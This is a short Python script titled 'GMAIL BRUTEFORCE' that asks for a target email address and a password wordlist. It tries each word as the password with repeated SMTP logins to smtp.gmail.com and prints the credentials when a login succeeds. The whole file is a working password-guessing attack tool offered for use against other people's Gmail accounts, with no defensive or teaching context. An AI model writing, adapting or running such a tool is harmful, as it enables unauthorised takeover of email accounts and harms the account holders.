import smtplib
import os,sys
import time

u="\033[4m"
w="\x1b[00m"
r="\x1b[91;1m"
c="\x1b[36;1m"
y ="\x1b[33m"
b="\033[34;1m"
g="\033[32;1m"

user = ""
file = ""

def server():
	smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
	smtpserver.ehlo()
	smtpserver.starttls()

def main():
        global user
        global file
        print ("")
        print (g+' GMAIL BRUTEFORCE'+w+' - by @saydog.official')
        print (w+'-------------------------------------------')
        print (w+' This bruteforce is not work if Gmail Account')
        print (w+' protected by Two-Factor Authentication (2FA)')
        print (w+'-------------------------------------------')
        print ("")
        user = str(input(b+"[+]"+w+" E-mail target: "))
        if user == "" or user == " ":
                sys.exit(1)
        else:
                user = user
                pass
        file = str(input(b+"[+]"+w+" Password path: "))
        if file == "" or file == " ":
                sys.exit(1)
        else:
                file = file
                pass
        print(b+"[+]"+w+" Starting bruteforce attack to "+user)
        print(b+"[+]"+w+" List of words found on "+file)
        time.sleep(3)
        print(b+"[+]"+w+" Preparing for attack ...")
        time.sleep(2)
        print("")
        print(g+"[!]"+w+" Bruteforce is running")
        print("")
        file = open(file,"r")
        for password in file:
                try:
                        smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
                        smtpserver.ehlo()
                        smtpserver.starttls()
                        smtpserver.login(user, password)
                        print ("")
                        print ("\033[00m{\033[30m\033[47m Login Success \033[00m}")
                        print ("")
                        print (g+'[+]'+w+' Accounts : '+user)
                        print (g+'[+]'+w+' Password : '+password)
                        print ("")
                        dog = str(input("[ enter ]"))
                        if dog == "" or dog == " ":
                                sys.exit(1)
                        else:
                                sys.exit(1)
                except smtplib.SMTPAuthenticationError:
                        print(r+"[!]"+w+" Password incorrect:- %s" % password.strip())
                except FileNotFoundError:
                        print(r+"[!ERROR]"+w+" username or wordlist doesn't exist!")
                except KeyboardInterrupt:
                        sys.exit(1)
                else:
                        sys.exit(1)

def menu():
        try:
                main()
        except KeyboardInterrupt:
                sys.exit(1)
        except FileNotFoundError:
                print(r+"[!ERROR]"+w+" username or wordlist doesn't exist!")
                sys.exit(1)

menu()